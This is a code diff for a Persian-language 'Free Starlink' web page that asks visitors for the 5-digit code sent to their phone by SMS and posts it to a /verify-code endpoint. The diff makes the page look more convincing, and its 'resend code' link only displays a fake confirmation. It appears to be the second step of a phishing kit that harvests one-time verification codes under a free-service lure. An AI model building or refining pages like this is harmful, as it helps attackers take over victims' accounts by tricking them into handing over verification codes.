@@ -1,19 +1,57 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="fa" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>Free Starlink – تایید</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تایید کد - Free Starlink</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="container">
-    <h1>Free Starlink</h1>
-    <p>کد ۵ رقمی پیامکی را وارد کنید</p>
-    <form id="form-step2">
-      <input name="code" placeholder="کد ۵ رقمی" pattern="\d{5}" required>
-      <button type="submit">ارسال</button>
-    </form>
+    <div class="card">
+      <div class="header">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%234a86e8' d='M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-3 12H7v-2h10v2zm0-3H7V9h10v2zm0-3H7V6h10v2z'/%3E%3C/svg%3E" alt="Verify Icon">
+        <h1>تایید هویت</h1>
+      </div>
+      
+      <p class="instruction">کد ۵ رقمی ارسال شده به تلفن همراه خود را وارد کنید</p>
+      
+      <form id="verifyForm" action="/verify-code" method="POST">
+        <div class="form-group">
+          <label for="code">کد تایید</label>
+          <input 
+            type="text" 
+            id="code" 
+            name="code"
+            maxlength="5"
+            pattern="\d{5}"
+            placeholder="-----"
+            required>
+        </div>
+        
+        <button type="submit" class="btn-primary">تایید و فعالسازی</button>
+        
+        <div class="resend">
+          <p>کد را دریافت نکرده‌اید؟ <a href="#" id="resendLink">ارسال مجدد کد</a></p>
+        </div>
+      </form>
+    </div>
   </div>
-  <script src="script.js"></script>
+
+  <script>
+    document.getElementById('verifyForm').addEventListener('submit', function(e) {
+      const code = document.getElementById('code').value;
+      
+      if(!/^\d{5}$/.test(code)) {
+        alert('کد تایید باید ۵ رقم باشد');
+        e.preventDefault();
+      }
+    });
+    
+    document.getElementById('resendLink').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('کد جدید ارسال شد!');
+    });
+  </script>
 </body>
 </html>
